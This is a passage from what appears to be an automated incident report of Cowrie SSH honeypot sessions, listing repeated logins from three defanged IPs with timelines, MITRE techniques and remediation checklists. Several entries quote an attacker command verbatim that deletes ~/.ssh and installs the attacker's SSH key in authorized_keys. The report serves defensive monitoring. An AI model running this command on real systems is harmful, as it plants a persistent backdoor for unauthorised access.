| `2026-04-23 05:17:54` | `cowrie.client.version` |
| `2026-04-23 05:17:54` | `cowrie.client.kex` |
| `2026-04-23 05:17:55` | `cowrie.login.success` |
| `2026-04-23 05:17:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da497f11b490

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:20 |
| **Last Seen** | 2026-04-23 05:20 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:20:07` | `cowrie.session.connect` |
| `2026-04-23 05:20:07` | `cowrie.client.version` |
| `2026-04-23 05:20:07` | `cowrie.client.kex` |
| `2026-04-23 05:20:08` | `cowrie.login.success` |
| `2026-04-23 05:20:09` | `cowrie.session.params` |
| `2026-04-23 05:20:09` | `cowrie.command.input` |
| `2026-04-23 05:20:09` | `cowrie.command.failed` |
| `2026-04-23 05:20:09` | `cowrie.log.closed` |
| `2026-04-23 05:20:09` | `cowrie.session.params` |
| `2026-04-23 05:20:09` | `cowrie.command.input` |
| `2026-04-23 05:20:10` | `cowrie.session.file_download` |
| `2026-04-23 05:20:10` | `cowrie.log.closed` |
| `2026-04-23 05:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f4e4d4639127

| Field | Detail |
|---|---|
| **Source IP** | `103.183.74[.]182` |
| **First Seen** | 2026-04-23 05:20 |
| **Last Seen** | 2026-04-23 05:20 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:20:12` | `cowrie.session.connect` |
| `2026-04-23 05:20:12` | `cowrie.client.version` |
| `2026-04-23 05:20:13` | `cowrie.client.kex` |
| `2026-04-23 05:20:13` | `cowrie.login.success` |
| `2026-04-23 05:20:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.183.74[.]182` to AbuseIPDB if not already reported
- [ ] Block `103.183.74[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-98c33c7dd486

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:23 |
| **Last Seen** | 2026-04-23 05:23 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:23:41` | `cowrie.session.connect` |
| `2026-04-23 05:23:41` | `cowrie.client.version` |
| `2026-04-23 05:23:41` | `cowrie.client.kex` |
| `2026-04-23 05:23:42` | `cowrie.login.success` |
| `2026-04-23 05:23:42` | `cowrie.session.params` |
| `2026-04-23 05:23:42` | `cowrie.command.input` |
| `2026-04-23 05:23:42` | `cowrie.command.failed` |
| `2026-04-23 05:23:42` | `cowrie.log.closed` |
| `2026-04-23 05:23:42` | `cowrie.session.params` |
| `2026-04-23 05:23:42` | `cowrie.command.input` |
| `2026-04-23 05:23:43` | `cowrie.session.file_download` |
| `2026-04-23 05:23:43` | `cowrie.log.closed` |
| `2026-04-23 05:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f552370cb3f8

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:23 |
| **Last Seen** | 2026-04-23 05:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:23:44` | `cowrie.session.connect` |
| `2026-04-23 05:23:44` | `cowrie.client.version` |
| `2026-04-23 05:23:44` | `cowrie.client.kex` |
| `2026-04-23 05:23:45` | `cowrie.login.success` |
| `2026-04-23 05:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1493ccc1b10b

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:25 |
| **Last Seen** | 2026-04-23 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:25:35` | `cowrie.session.connect` |
| `2026-04-23 05:25:35` | `cowrie.client.version` |
| `2026-04-23 05:25:36` | `cowrie.client.kex` |
| `2026-04-23 05:25:36` | `cowrie.login.success` |
| `2026-04-23 05:25:36` | `cowrie.session.params` |
| `2026-04-23 05:25:36` | `cowrie.command.input` |
| `2026-04-23 05:25:36` | `cowrie.command.failed` |
| `2026-04-23 05:25:36` | `cowrie.log.closed` |
| `2026-04-23 05:25:37` | `cowrie.session.params` |
| `2026-04-23 05:25:37` | `cowrie.command.input` |
| `2026-04-23 05:25:37` | `cowrie.session.file_download` |
| `2026-04-23 05:25:37` | `cowrie.log.closed` |
| `2026-04-23 05:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5fca1d35a4ed

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:25 |
| **Last Seen** | 2026-04-23 05:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:25:39` | `cowrie.session.connect` |
| `2026-04-23 05:25:39` | `cowrie.client.version` |
| `2026-04-23 05:25:39` | `cowrie.client.kex` |
| `2026-04-23 05:25:39` | `cowrie.login.success` |
| `2026-04-23 05:25:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-edd3639c9d73

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:26 |
| **Last Seen** | 2026-04-23 05:26 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:26:29` | `cowrie.session.connect` |
| `2026-04-23 05:26:29` | `cowrie.client.version` |
| `2026-04-23 05:26:29` | `cowrie.client.kex` |
| `2026-04-23 05:26:30` | `cowrie.login.success` |
| `2026-04-23 05:26:30` | `cowrie.session.params` |
| `2026-04-23 05:26:30` | `cowrie.command.input` |
| `2026-04-23 05:26:30` | `cowrie.command.failed` |
| `2026-04-23 05:26:30` | `cowrie.log.closed` |
| `2026-04-23 05:26:30` | `cowrie.session.params` |
| `2026-04-23 05:26:30` | `cowrie.command.input` |
| `2026-04-23 05:26:30` | `cowrie.session.file_download` |
| `2026-04-23 05:26:30` | `cowrie.log.closed` |
| `2026-04-23 05:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7eb848581a01

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:26 |
| **Last Seen** | 2026-04-23 05:26 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:26:32` | `cowrie.session.connect` |
| `2026-04-23 05:26:32` | `cowrie.client.version` |
| `2026-04-23 05:26:32` | `cowrie.client.kex` |
| `2026-04-23 05:26:33` | `cowrie.login.success` |
| `2026-04-23 05:26:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6f84582c462

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:29 |
| **Last Seen** | 2026-04-23 05:29 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:29:02` | `cowrie.session.connect` |
| `2026-04-23 05:29:02` | `cowrie.client.version` |
| `2026-04-23 05:29:02` | `cowrie.client.kex` |
| `2026-04-23 05:29:02` | `cowrie.login.success` |
| `2026-04-23 05:29:03` | `cowrie.session.params` |
| `2026-04-23 05:29:03` | `cowrie.command.input` |
| `2026-04-23 05:29:03` | `cowrie.command.failed` |
| `2026-04-23 05:29:03` | `cowrie.log.closed` |
| `2026-04-23 05:29:03` | `cowrie.session.params` |
| `2026-04-23 05:29:03` | `cowrie.command.input` |
| `2026-04-23 05:29:03` | `cowrie.session.file_download` |
| `2026-04-23 05:29:03` | `cowrie.log.closed` |
| `2026-04-23 05:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c2e4244c262

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:29 |
| **Last Seen** | 2026-04-23 05:29 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:29:05` | `cowrie.session.connect` |
| `2026-04-23 05:29:05` | `cowrie.client.version` |
| `2026-04-23 05:29:05` | `cowrie.client.kex` |
| `2026-04-23 05:29:05` | `cowrie.login.success` |
| `2026-04-23 05:29:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e58bd3beff94

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:30 |
| **Last Seen** | 2026-04-23 05:30 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:30:47` | `cowrie.session.connect` |
| `2026-04-23 05:30:47` | `cowrie.client.version` |
| `2026-04-23 05:30:47` | `cowrie.client.kex` |
| `2026-04-23 05:30:48` | `cowrie.login.success` |
| `2026-04-23 05:30:48` | `cowrie.session.params` |
| `2026-04-23 05:30:48` | `cowrie.command.input` |
| `2026-04-23 05:30:48` | `cowrie.command.failed` |
| `2026-04-23 05:30:48` | `cowrie.log.closed` |
| `2026-04-23 05:30:49` | `cowrie.session.params` |
| `2026-04-23 05:30:49` | `cowrie.command.input` |
| `2026-04-23 05:30:49` | `cowrie.session.file_download` |
| `2026-04-23 05:30:49` | `cowrie.log.closed` |
| `2026-04-23 05:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4998edaecc0

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:30 |
| **Last Seen** | 2026-04-23 05:30 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:30:51` | `cowrie.session.connect` |
| `2026-04-23 05:30:51` | `cowrie.client.version` |
| `2026-04-23 05:30:51` | `cowrie.client.kex` |
| `2026-04-23 05:30:51` | `cowrie.login.success` |
| `2026-04-23 05:30:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-08b2361c16f0

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:31 |
| **Last Seen** | 2026-04-23 05:31 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:31:50` | `cowrie.session.connect` |
| `2026-04-23 05:31:50` | `cowrie.client.version` |
| `2026-04-23 05:31:50` | `cowrie.client.kex` |
| `2026-04-23 05:31:50` | `cowrie.login.success` |
| `2026-04-23 05:31:50` | `cowrie.session.params` |
| `2026-04-23 05:31:50` | `cowrie.command.input` |
| `2026-04-23 05:31:50` | `cowrie.command.failed` |
| `2026-04-23 05:31:51` | `cowrie.log.closed` |
| `2026-04-23 05:31:51` | `cowrie.session.params` |
| `2026-04-23 05:31:51` | `cowrie.command.input` |
| `2026-04-23 05:31:51` | `cowrie.session.file_download` |
| `2026-04-23 05:31:51` | `cowrie.log.closed` |
| `2026-04-23 05:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-74ae8c214d15

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:31 |
| **Last Seen** | 2026-04-23 05:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:31:53` | `cowrie.session.connect` |
| `2026-04-23 05:31:53` | `cowrie.client.version` |
| `2026-04-23 05:31:53` | `cowrie.client.kex` |
| `2026-04-23 05:31:54` | `cowrie.login.success` |
| `2026-04-23 05:31:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.80.24[.]238` to AbuseIPDB if not already reported
- [ ] Block `47.80.24[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a6684b14ea1a

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:33 |
| **Last Seen** | 2026-04-23 05:33 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:33:22` | `cowrie.session.connect` |
| `2026-04-23 05:33:22` | `cowrie.client.version` |
| `2026-04-23 05:33:22` | `cowrie.client.kex` |
| `2026-04-23 05:33:23` | `cowrie.login.success` |
| `2026-04-23 05:33:23` | `cowrie.session.params` |
| `2026-04-23 05:33:23` | `cowrie.command.input` |
| `2026-04-23 05:33:23` | `cowrie.command.failed` |
| `2026-04-23 05:33:23` | `cowrie.log.closed` |
| `2026-04-23 05:33:23` | `cowrie.session.params` |
| `2026-04-23 05:33:23` | `cowrie.command.input` |
| `2026-04-23 05:33:23` | `cowrie.session.file_download` |
| `2026-04-23 05:33:23` | `cowrie.log.closed` |
| `2026-04-23 05:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c961dfc2209d

| Field | Detail |
|---|---|
| **Source IP** | `165.154.20[.]216` |
| **First Seen** | 2026-04-23 05:33 |
| **Last Seen** | 2026-04-23 05:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-23 05:33:25` | `cowrie.session.connect` |
| `2026-04-23 05:33:25` | `cowrie.client.version` |
| `2026-04-23 05:33:25` | `cowrie.client.kex` |
| `2026-04-23 05:33:26` | `cowrie.login.success` |
| `2026-04-23 05:33:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `165.154.20[.]216` to AbuseIPDB if not already reported
- [ ] Block `165.154.20[.]216` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3d3122b84dbc

| Field | Detail |
|---|---|
| **Source IP** | `47.80.24[.]238` |
| **First Seen** | 2026-04-23 05:34 |
| **Last Seen** | 2026-04-23 05:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
